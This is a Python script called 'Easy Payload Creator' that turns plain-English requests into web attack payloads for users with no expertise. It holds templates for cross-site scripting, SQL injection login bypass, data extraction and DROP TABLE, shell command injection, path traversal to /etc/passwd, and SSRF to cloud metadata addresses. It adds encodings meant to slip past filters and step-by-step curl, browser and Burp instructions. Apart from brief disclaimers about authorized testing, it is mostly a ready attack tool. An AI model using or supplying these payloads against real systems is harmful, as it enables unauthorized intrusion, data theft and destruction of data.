#!/usr/bin/env python3
"""
Easy Payload Creator - No expertise needed!
Just describe what you want to test in plain English
"""

import json
import base64
import urllib.parse

class EasyPayloadCreator:
    """Create payloads from plain English descriptions"""
    
    def __init__(self):
        self.attack_patterns = {
            # XSS patterns
            'alert': {'type': 'xss', 'payloads': [
                '<script>alert("{msg}")</script>',
                '<img src=x onerror=alert("{msg}")>',
                '<svg/onload=alert("{msg}")>',
                '<input onfocus=alert("{msg}") autofocus>',
            ]},
            'popup': {'type': 'xss', 'payloads': [
                '<script>alert("{msg}")</script>',
                '<script>confirm("{msg}")</script>',
                '<script>prompt("{msg}")</script>',
            ]},
            'javascript': {'type': 'xss', 'payloads': [
                '<script>{msg}</script>',
                'javascript:{msg}',
                '<img src=x onerror={msg}>',
            ]},
            
            # SQLi patterns
            'database': {'type': 'sqli', 'payloads': [
                "' OR '1'='1' -- {msg}",
                "' UNION SELECT {msg}--",
                "1; DROP TABLE {msg}--",
            ]},
            'login bypass': {'type': 'sqli', 'payloads': [
                "admin' OR '1'='1",
                "admin'--",
                "' OR 1=1--",
            ]},
            'extract data': {'type': 'sqli', 'payloads': [
                "' UNION SELECT {msg} FROM users--",
                "' AND 1=0 UNION SELECT {msg}--",
            ]},
            
            # Command injection
            'run command': {'type': 'command', 'payloads': [
                '; {msg}',
                '| {msg}',
                '`{msg}`',
                '$({msg})',
            ]},
            'execute': {'type': 'command', 'payloads': [
                '; {msg}',
                '&& {msg}',
                '|| {msg}',
            ]},
            
            # Path traversal
            'read file': {'type': 'path', 'payloads': [
                '../../../{msg}',
                '..\\..\\..\\{msg}',
                '....//....//....///{msg}',
            ]},
            'access': {'type': 'path', 'payloads': [
                '../{msg}',
                '../../{msg}',
                '%2e%2e%2f{msg}',
            ]},
            
            # SSRF
            'internal': {'type': 'ssrf', 'payloads': [
                'http://localhost/{msg}',
                'http://127.0.0.1/{msg}',
                'http://169.254.169.254/{msg}',
            ]},
            'redirect': {'type': 'ssrf', 'payloads': [
                'http://{msg}',
                'https://{msg}',
                'file:///{msg}',
            ]},
        }
    
    def understand_intent(self, user_input):
        """Understand what the user wants to do"""
        user_input_lower = user_input.lower()
        
        # Check for keywords
        for keyword, config in self.attack_patterns.items():
            if keyword in user_input_lower:
                return config
        
        # Default patterns based on common words
        if any(word in user_input_lower for word in ['show', 'display', 'alert', 'popup', 'message']):
            return self.attack_patterns['alert']
        
        if any(word in user_input_lower for word in ['login', 'bypass', 'admin', 'password']):
            return self.attack_patterns['login bypass']
        
        if any(word in user_input_lower for word in ['command', 'execute', 'run', 'shell']):
            return self.attack_patterns['run command']
        
        if any(word in user_input_lower for word in ['file', 'read', 'access', 'passwd']):
            return self.attack_patterns['read file']
        
        if any(word in user_input_lower for word in ['database', 'sql', 'table', 'select']):
            return self.attack_patterns['database']
        
        # Default to XSS
        return self.attack_patterns['alert']
    
    def extract_message(self, user_input):
        """Extract the actual message/value from user input"""
        # Remove common instruction words
        words_to_remove = ['show', 'display', 'alert', 'popup', 'message', 'with', 'saying', 
                          'execute', 'run', 'command', 'read', 'file', 'access', 'bypass',
                          'login', 'as', 'admin', 'get', 'data', 'from', 'table', 'database']
        
        words = user_input.split()
        filtered = [w for w in words if w.lower() not in words_to_remove]
        
        if filtered:
            return ' '.join(filtered)
        
        return 'test'
    
    def create_payload(self, user_input):
        """Create payload from plain English input"""
        config = self.understand_intent(user_input)
        message = self.extract_message(user_input)
        
        payloads = []
        for template in config['payloads']:
            if '{msg}' in template:
                payload = template.format(msg=message)
            else:
                payload = template
            payloads.append(payload)
        
        return {
            'type': config['type'],
            'message': message,
            'payloads': payloads
        }
    
    def encode_payload(self, payload, encoding='url'):
        """Encode payload"""
        encodings = {
            'url': lambda p: urllib.parse.quote(p),
            'base64': lambda p: base64.b64encode(p.encode()).decode(),
            'hex': lambda p: ''.join(f'\\x{ord(c):02x}' for c in p),
        }
        return encodings.get(encoding, lambda p: p)(payload)

def interactive_mode():
    """Super easy interactive mode"""
    creator = EasyPayloadCreator()
    
    print("=" * 70)
    print("🎯 EASY PAYLOAD CREATOR - No Expertise Needed!")
    print("=" * 70)
    print("\nJust tell me what you want to test in plain English!")
    print("I'll create the technical payload for you.\n")
    
    print("📚 Examples of what you can say:")
    print("  - 'Show an alert saying Hello'")
    print("  - 'Display a popup with XSS'")
    print("  - 'Bypass login as admin'")
    print("  - 'Read file /etc/passwd'")
    print("  - 'Execute command whoami'")
    print("  - 'Get data from users table'")
    print("  - 'Access internal localhost'")
    print()
    
    while True:
        print("=" * 70)
        user_input = input("💬 What do you want to test? (or 'quit' to exit): ").strip()
        
        if user_input.lower() in ['quit', 'exit', 'q']:
            print("\n👋 Goodbye! Happy (authorized) testing!")
            break
        
        if not user_input:
            continue
        
        # Create payload
        result = creator.create_payload(user_input)
        
        print(f"\n✅ I understood: You want to test {result['type'].upper()}")
        print(f"📝 Message/Value: {result['message']}")
        print(f"\n🎯 Here are your payloads:\n")
        
        for i, payload in enumerate(result['payloads'], 1):
            print(f"{i}. {payload}")
        
        # Ask if they want encoding
        print("\n🔧 Want to encode these? (url/base64/hex/none)")
        encoding = input("Encoding: ").strip().lower()
        
        encoded_payloads = []
        if encoding in ['url', 'base64', 'hex']:
            print(f"\n🔐 Encoded payloads ({encoding}):\n")
            for i, payload in enumerate(result['payloads'], 1):
                encoded = creator.encode_payload(payload, encoding)
                encoded_payloads.append(encoded)
                print(f"{i}. {encoded}")
        
        # Show step-by-step testing instructions
        print("\n" + "=" * 70)
        print("📋 STEP-BY-STEP: How to Test These Payloads")
        print("=" * 70)
        
        # Select first payload for examples
        test_payload = encoded_payloads[0] if encoded_payloads else result['payloads'][0]
        
        # Show different testing methods based on attack type
        if result['type'] == 'xss':
            print("\n🌐 Method 1: Test in Browser")
            print("   1. Open your test website")
            print("   2. Find a search box or input field")
            print(f"   3. Paste this payload: {test_payload}")
            print("   4. Submit the form")
            print("   5. If XSS works, you'll see an alert popup!\n")
            
            print("💻 Method 2: Test with cURL")
            print(f"   curl 'https://your-test-site.com/search?q={test_payload}'")
            print("   (Replace 'your-test-site.com' with your actual test site)\n")
            
            print("🔧 Method 3: Test with Burp Suite")
            print("   1. Intercept a request in Burp")
            print("   2. Find the parameter you want to test")
            print(f"   3. Replace value with: {test_payload}")
            print("   4. Forward the request")
            print("   5. Check the response for alert execution\n")
        
        elif result['type'] == 'sqli':
            print("\n🔐 Method 1: Test Login Form in Browser")
            print("   1. Go to login page")
            print(f"   2. Username: {test_payload}")
            print("   3. Password: anything")
            print("   4. Click Login")
            print("   5. If SQLi works, you'll bypass authentication!\n")
            
            print("💻 Method 2: Test with cURL")
            print(f"   curl -X POST https://your-test-site.com/login \\")
            print(f"        -d 'username={test_payload}&password=test'")
            print("   (Check response for successful login)\n")
            
            print("🔧 Method 3: Test URL Parameter")
            print(f"   curl 'https://your-test-site.com/user?id={test_payload}'")
            print("   (Look for SQL errors or unexpected data)\n")
        
        elif result['type'] == 'command':
            print("\n💻 Method 1: Test with cURL")
            print(f"   curl 'https://your-test-site.com/ping?host=127.0.0.1{test_payload}'")
            print("   (Check response for command output)\n")
            
            print("🌐 Method 2: Test in Browser")
            print("   1. Find a feature that executes commands (ping, traceroute, etc.)")
            print(f"   2. Input: 127.0.0.1{test_payload}")
            print("   3. Submit")
            print("   4. Check output for command execution\n")
            
            print("📝 Method 3: Test with Postman")
            print("   1. Create POST request to your test endpoint")
            print(f"   2. Body: {{\"command\": \"ping 127.0.0.1{test_payload}\"}}")
            print("   3. Send request")
            print("   4. Check response\n")
        
        elif result['type'] == 'path':
            print("\n💻 Method 1: Test with cURL")
            print(f"   curl 'https://your-test-site.com/download?file={test_payload}'")
            print("   (Check if you can read the file)\n")
            
            print("🌐 Method 2: Test in Browser")
            print(f"   1. Go to: https://your-test-site.com/download?file={test_payload}")
            print("   2. Check if file contents are displayed")
            print("   3. Look for /etc/passwd content or error messages\n")
            
            print("🔧 Method 3: Test File Upload")
            print("   1. Find file upload feature")
            print(f"   2. Upload file with name: {test_payload}")
            print("   3. Try to access the uploaded file\n")
        
        elif result['type'] == 'ssrf':
            print("\n💻 Method 1: Test with cURL")
            print(f"   curl -X POST https://your-test-site.com/fetch \\")
            print(f"        -d '{{\"url\": \"{test_payload}\"}}'")
            print("   (Check if internal resource is accessed)\n")
            
            print("🌐 Method 2: Test in Browser")
            print("   1. Find URL input field (image URL, webhook, etc.)")
            print(f"   2. Enter: {test_payload}")
            print("   3. Submit")
            print("   4. Check if internal resource is fetched\n")
        
        # General tips
        print("=" * 70)
        print("💡 IMPORTANT TIPS:")
        print("=" * 70)
        print("✅ ONLY test on websites you own or have permission to test")
        print("✅ Start with the first payload, try others if it doesn't work")
        print("✅ Check browser console (F12) for errors or responses")
        print("✅ Look for error messages - they give clues!")
        print("✅ Try different payloads if one doesn't work")
        print("✅ Use encoding if payloads are being blocked")
        print("\n⚠️  NEVER test on websites you don't own - it's ILLEGAL!")
        print("=" * 70 + "\n")

def quick_mode():
    """Quick one-liner mode"""
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python3 easy_payload_creator.py 'your request in plain English'")
        print("Example: python3 easy_payload_creator.py 'show alert saying test'")
        return
    
    creator = EasyPayloadCreator()
    user_input = ' '.join(sys.argv[1:])
    
    result = creator.create_payload(user_input)
    
    print(f"Type: {result['type'].upper()}")
    print(f"Message: {result['message']}")
    print("\nPayloads:")
    for payload in result['payloads']:
        print(f"  {payload}")

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) > 1:
        quick_mode()
    else:
        interactive_mode()
